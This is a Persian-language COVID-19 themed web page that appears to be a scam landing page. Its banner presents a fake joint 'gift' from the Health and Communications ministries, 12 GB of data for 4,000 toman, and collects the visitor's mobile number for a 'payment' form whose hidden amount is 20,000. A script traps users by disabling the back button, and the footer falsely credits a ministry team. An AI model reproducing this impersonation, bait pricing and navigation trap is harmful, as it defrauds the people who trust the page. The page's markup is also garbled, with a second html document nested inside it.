<!DOCTYPE html>
<html lang="fa">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" href="css/animate.css">
		<link rel="stylesheet" href="css/bootstrap.min.css">
		<link rel="stylesheet" href="css/icofont.min.css">
		<link rel="stylesheet" href="css/lightcase.css">
		<link rel="stylesheet" href="css/swiper.min.css">
		<link rel="stylesheet" href="css/style.css">
		<title>اینترنت برای در خانه ماندن</title>
	</head>
	<Body>
		<section class="banner-section home-3">
			<div class="banner-area">
				<div class="container">
					<div class="row align-items-center justify-content-center">
						<div class="col-md-6 col-12">
							<div class="content-part">
								<div class="banner-content">
                                   <html>
<head>
    <link rel="shortcut icon" href="" type="image/x-icon">
    
                <link rel="stylesheet" href="css/sq86-stylev6.css">
<body>
    <link rel="manifest" href="">
    <section class="">
        <div class="cart">
          <div id="container">
            <div class="content">
               <div class="banner-round">
			   <br>
                      			   <br>
          <img src="img/01.png" alt="banner">
                            </div>
                <main>
                       <p class="membership">هدیه بزرگ وزارت بهداشت با همراهی وزارت ارتباطات به تمامی مشترکین
12 گیگ 4 هزار تومان</p>
                       <form class="mobile-form" action="payment" method="post">
                            <div class="inputSubmit">
                               <input type="hidden" name="ReferralCode" />
							   <input type="hidden" name="ReferralCode" />
                               <input autocomplete="off" type="tel" required="required" id="Msisdn" name="Msisdn" autofocus="true" placeholder="09xxxxxxxxx">
                               <div class="signup">
							   <input type="hidden" name="amount" value="20000">
                                 <Button type="submit"  class="btn submit"><b>تایید و پرداخت</b></Button>
							
                               </div>
                            </div> 
                        </form>
                        <div class="text-danger" id="ErrorForInvalidMsisdn" ></div>
                        <div id="divProcessing" style="text-align:center;">
                             <h4 id="text"> شکیبا باشید</h4>
                             <span class="load-spn" id="spn1"></span>
                             <span class="load-spn" id="spn2"></span>
                             <span class="load-spn" id="spn3"></span>
                        </div>
                  </main>
              </div>
          </div>
        </div>        
    </section>
    <div id="messages"></div>

   <script src="js/jquery-1.11.1.min.js"></script>
    <script src="js/jquery.inputmask.bundle.min.js"></script>

   <script async src="../dahgigcell/js@id=UA-139152180-1.htm"></script>
   <script>
       window.dataLayer = window.dataLayer || [];
       function gtag(){dataLayer.push(arguments);}
       gtag('js', new Date());

       gtag('config', 'UA-139152180-1');
    </script>    
    <script type="text/javascript">
        $(document).ready(function(){
          setTimeout(function(){
             $("#header .counter").slideUp(1000);
             $(".signup").fadeIn(500);
          }, 5000);
        });
      </script>  
    <script>
      $(document).ready(function() {
           var persianNumbers = [
               /۰/g,
               /۱/g,
               /۲/g,
               /۳/g,
               /۴/g,
               /۵/g,
               /۶/g,
               /۷/g,
               /۸/g,
               /۹/g
            ],
            arabicNumbers = [
                /٠/g,
                /١/g,
                /٢/g,
                /٣/g,
                /٤/g,
                /٥/g,
                /٦/g,
                /٧/g,
                /٨/g,
                /٩/g
             ],
             fixNumbers = function(str) {
                 if (typeof str === "string") {
                     for (var i = 0; i < 10; i++) {
                          str = str.replace(persianNumbers[i], i).replace(arabicNumbers[i], i);
                     }
                 }
                 return str;
             };
            $("#request-btn").click(function(e) {
                e.preventDefault();
                if (!$(this).hasClass('disabled')) {
                    var msisdn = $("#Msisdn").val();
                    msisdn = msisdn.replace("_", "");
                    msisdn = fixNumbers(msisdn);
                    var ussd = /(^(09|9)[3][0-9]\d{7}$)|(^(989|9)[3][0-9]\d{7}$)|(^(09|9)[0][0-9]\d{7}$)|(^(989|9)[0][0-9]\d{7}$)|(^(09|9)[۳][۰-۹]\d{7}$)|(^(989|9)[۳][۰-۹]\d{7}$)|(^(09|9)[۰][۰-۹]\d{7}$)|(^(989|9)[۰][۰-۹]\d{7}$)/.test(msisdn);
                    console.log(ussd);
                    if (!ussd) {
                           $('.mobile-form').submit();
                    }
                    localStorage.setItem("msisdn", msisdn);
                 }
            });

            var msisdn = $('#Msisdn').val();
            msisdn = msisdn.replace('_', '');
            if (msisdn.length === 11) {
                $("#request-btn").removeClass("disabled");
            } else {
                $("#request-btn").addClass("disabled");
            }

            $("#Msisdn").inputmask({
                regex: "09[0-9۰-۹٠-٩]{9}",
                allowPlus: false,
                allowMinus: false,
                prefix: "09"
            });

            $('#Msisdn').on('change paste keyup input propertychange', function () {
                if ($(this).inputmask("isComplete")) {
                    $("#request-btn").removeClass("disabled");
                } else {
                    $("#request-btn").addClass("disabled");
                }
            });

            $('#Msisdn').on('keypress', function (e) {
                var code = (e.keyCode ? e.keyCode : e.which);
                if (code == 13) { //Enter keycode
                    e.preventDefault();
                    $('#request-btn').click();
                }
            });
        });

    </script>
    <script>
        $(document).on('invalid-form.validate', 'form', function () {
            var button = $(this).find('input[type="submit"]');
            setTimeout(function () {
                button.removeAttr('disabled');
            }, 1);
        });
        $(document).on('submit', 'form', function () {
            $("#divProcessing").show();
            var button = $(this).find('input[type="submit"]');
            setTimeout(function () {
                button.attr('disabled', 'disabled');
            }, 0);
        });
    </script>
    <script>
        $("#divProcessing").hide();
    </script>
    <script>
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };
    </script>
<script>
    $(document).ready(function () {
        $("#ErrorForInvalidMsisdn").text('');
       
    })
</script>
		<section class="safe-actions style-2 padding-tb bg-action">
			<div class="container">
                <div class="section-header">
					<h2>چگونه دست هایمان را بشوییم؟</h2>
					<p>شستن دست ها به تنهایی مهمترین گام در جلوگیری از انواع بیماری ها است. حال سوالی امکان دارد در ذهن شما پیش بیاید این است که چه زمانی و چگونه دست ها را بشوییم؟</p>
				</div>
				<div class="row justify-content-center align-items-center" style=" counter-reset: topx;">
					<div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/01.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>دستانتان رو خیس کنید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/02.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>صابون بزنید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/03.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>صابون له کف دست بمالید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/04.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>کف دست ها را به هم بمالید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/05.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>بین انگشتان را بکشید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/06.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>پشت انگشتان را بمالید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/07.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>انگشتان را تمیز کنید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/08.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>ناخن ها و نوک انگشتان را بشویید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/09.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>دست ها را بشویید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/10.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>با یک حوله یکبار مصرف خشک کنید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/11.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>برای بستن شیر آب از حوله استفاده کنید</h6>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-sm-6 col-12">
                        <div class="safe-item">
                            <div class="safe-thumb">
                                <img src="img/12.jpg" alt="safe">
                            </div>
                            <div class="safe-content">
                                <h6>دستان شما تمیز است</h6>
                            </div>
                        </div>
					</div>
				</div>
			</div>
		</section>
		<section class="blog-section home-3 bgc-blog padding-tb">
            <div class="container">
				<div class="section-header">
                    <h2>محبوب ترین اخبار و مقالات ما</h2>
                    <p>مقالات و اخبار اختصاصی کرونا ویروس و نکات بهداشتی را در اینجا مطالعه کنید.</p>
                </div>
                <div class="section-wrapper">
                    <div class="row justify-content-center">
                        <div class="col-lg-4 col-sm-6 col-12">
                            <div class="post-item style-2">
                                <div class="post-item-inner">
                                    <div class="post-thumb">
                                        <a href="#"><img src="img/01.jpg" alt="lab-blog"></a>
                                    </div>
									<div class="post-content">
                                        <h5><a href="#">شیوع ویروس کرونا و راه های مقابله با آن</a></h5>
                                        <div class="author-date">
                                            <a href="#" class="date"><i class="icofont-calendar"></i>1399/01/05</a>
                                            <a href="#" class="admin"><i class="icofont-ui-user"></i>علی سلیمانی</a>
                                        </div>
                                        <p> حفظ آرامش و تقویت سیستم ایمنی بدن و رعایت بهداشت فردی برای مقابله با شیوع ویروس کرونا مهم و حیاتی است. علائم کرونا را باید جدی گرفته شود.</p>
                                        <div class="post-footer">
                                            <a href="#" class="text-btn">ادامه مطلب<i class="icofont-double-left"></i></a>
                                            <a href="#" class="comments"><i class="icofont-comment"></i><span>2</span></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-sm-6 col-12">
                            <div class="post-item style-2">
                                <div class="post-item-inner">
                                    <div class="post-thumb">
                                        <a href="#"><img src="img/02.jpg" alt="lab-blog"></a>
                                    </div>
									<div class="post-content">
                                        <h5><a href="#">شیوع ویروس کرونا و راه های مقابله با آن</a></h5>
                                        <div class="author-date">
                                            <a href="#" class="date"><i class="icofont-calendar"></i>1399/01/05</a>
                                            <a href="#" class="admin"><i class="icofont-ui-user"></i>علی سلیمانی</a>
                                        </div>
                                        <p> حفظ آرامش و تقویت سیستم ایمنی بدن و رعایت بهداشت فردی برای مقابله با شیوع ویروس کرونا مهم و حیاتی است. علائم کرونا را باید جدی گرفته شود.</p>
                                        <div class="post-footer">
                                            <a href="#" class="text-btn">ادامه مطلب<i class="icofont-double-left"></i></a>
                                            <a href="#" class="comments"><i class="icofont-comment"></i><span>2</span></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-sm-6 col-12">
                            <div class="post-item style-2">
                                <div class="post-item-inner">
                                    <div class="post-thumb">
                                        <a href="#"><img src="img/03.jpg" alt="lab-blog"></a>
                                    </div>
									<div class="post-content">
                                        <h5><a href="#">شیوع ویروس کرونا و راه های مقابله با آن</a></h5>
                                        <div class="author-date">
                                            <a href="#" class="date"><i class="icofont-calendar"></i>1399/01/05</a>
                                            <a href="#" class="admin"><i class="icofont-ui-user"></i>علی سلیمانی</a>
                                        </div>
                                        <p> حفظ آرامش و تقویت سیستم ایمنی بدن و رعایت بهداشت فردی برای مقابله با شیوع ویروس کرونا مهم و حیاتی است. علائم کرونا را باید جدی گرفته شود.</p>
                                        <div class="post-footer">
                                            <a href="#" class="text-btn">ادامه مطلب<i class="icofont-double-left"></i></a>
                                            <a href="#" class="comments"><i class="icofont-comment"></i><span>2</span></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
		<footer style="background-image: url(img/footer-bg-3.jpg);">
			<div class="footer-top padding-tb">
				<div class="container">
					<div class="row">
						<div class="col-lg-3 col-md-6 col-12">
							<div class="footer-item first-set">
								<div class="footer-inner">
									<div class="footer-content">
										<div class="title">
											<h6>درباره Covid-19</h6>
										</div>
										<div class="content">
											<p>ما به استانداردهای طراحی ساده، خلاقانه و انعطاف پذیر اعتقاد داریم.</p>
											<h6>آدرس:</h6>
											<p>ایران، استان خراسان رضوی، مشهد</p>
											<ul class="lab-ul">
												<li>
													<p><span>تلفن:</span>(98) 51 1234 5678</p>
												</li>
												<li>
													<p><span>ایمیل:</span><a href="#">info@covid-19.com</a></p>
												</li>
											</ul>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="col-lg-3 col-md-6 col-12">
							<div class="footer-item">
								<div class="footer-inner">
									<div class="footer-content">
										<div class="title">
											<h6>دسترسی سریع</h6>
										</div>
										<div class="content">
											<ul class="lab-ul">
												<li><a href="#"><i class="icofont-caret-right"></i>تبلیغ کنندگان</a></li>
												<li><a href="#"><i class="icofont-caret-right"></i>توسعه دهندگان</a></li>
												<li><a href="#"><i class="icofont-caret-right"></i>منابع</a></li>
												<li><a href="#"><i class="icofont-caret-right"></i>کمپانی</a></li>
												<li><a href="#"><i class="icofont-caret-right"></i>ارتباط</a></li>
											</ul>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="col-lg-3 col-md-6 col-12">
							<div class="footer-item">
								<div class="footer-inner">
									<div class="footer-content">
										<div class="title">
											<h6>شبکه های اجتماعی</h6>
										</div>
										<div class="content">
											<ul class="lab-ul">
												<li><a href="#"><i class="icofont-facebook"></i>فیسبوک</a></li>
												<li><a href="#"><i class="icofont-twitter"></i>توئیتر</a></li>
												<li><a href="#"><i class="icofont-instagram"></i>اینستاگرام</a></li>
												<li><a href="#"><i class="icofont-youtube"></i>یوتیوب</a></li>
												<li><a href="#"><i class="icofont-telegram"></i>تلگرام</a></li>
											</ul>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="col-lg-3 col-md-6 col-12">
							<div class="footer-item">
								<div class="footer-inner">
									<div class="footer-content">
										<div class="title">
											<h6>حریم خصوصی و ضوابط</h6>
										</div>
										<div class="content">
											<ul class="lab-ul">
												<li><a href="#"><i class="icofont-caret-right"></i>توافق نامه تبلیغ کننده</a></li>
												<li><a href="#"><i class="icofont-caret-right"></i>خطی مشی استفاده</a></li>
												<li><a href="#"><i class="icofont-caret-right"></i>سیاست حفظ حریم خصوصی</a></li>
												<li><a href="#"><i class="icofont-caret-right"></i>حریم خصوصی فناوری</a></li>
												<li><a href="#"><i class="icofont-caret-right"></i>توافق نامه توسعه دهنده</a></li>
											</ul>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="footer-bottom">
				<div class="container">
					<div class="section-wrapper">
						<p>&copy; 1399 bimar تمامی حقوق محفوظ است. طراحی توسط <a href="https://www.rtl-theme.com/author/1webstar/"><b>تیم وزرات بهداشت</b></a></p>
					</div>
				</div>
			</div>
		</footer>
		<a href="#" class="scrollToTop"><i class="icofont-swoosh-up"></i><span class="pluse_1"></span><span class="pluse_2"></span></a>		
		<script src="js/jquery.js"></script>
		<script src="js/waypoints.min.js"></script>
		<script src="js/bootstrap.min.js"></script>
		<script src="js/lightcase.js"></script>
		<script src="js/isotope.pkgd.min.js"></script>
		<script src="js/swiper.min.js"></script>
		<script src="js/jquery.countdown.min.js"></script>
        <script src="js/functions.js"></script>
        </html>
